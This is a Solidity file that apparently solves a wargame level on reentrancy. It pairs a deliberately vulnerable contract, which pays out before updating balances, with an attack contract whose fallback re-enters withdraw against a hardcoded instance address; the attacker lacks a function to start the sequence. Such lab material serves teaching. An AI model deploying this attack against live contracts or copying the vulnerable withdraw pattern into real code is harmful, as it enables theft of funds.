pragma solidity ^0.8.0;

import "./contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}

contract Attack {
    //put your instance address
    Reentrance r = Reentrance(0xA38e0a3f960aF4b0f3Fa30b559d252BaB4f4a704);
    
    constructor() payable {
        
    }
    
    fallback() external payable {
        r.withdraw(msg.value);
    }
}
